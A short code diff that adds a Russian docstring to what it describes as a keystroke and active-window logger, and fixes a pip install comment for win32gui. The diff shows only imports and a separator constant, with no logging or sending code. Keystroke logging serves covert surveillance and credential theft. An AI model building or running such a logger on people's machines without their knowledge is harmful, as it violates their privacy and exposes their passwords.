@@ -1,5 +1,12 @@
+"""
+Записывает клавиши и активные окна.
+По завершении создает файл вида 2323432323534.txt в рабочем каталоге.
+Не удается конвертировать в .exe
+"""
+
+
 import keyboard   # pip install keyboard
-import win32gui   # pip install cd .\
+import win32gui   # pip install pywin32
 import datetime
 
 DATA_SEP = '|'
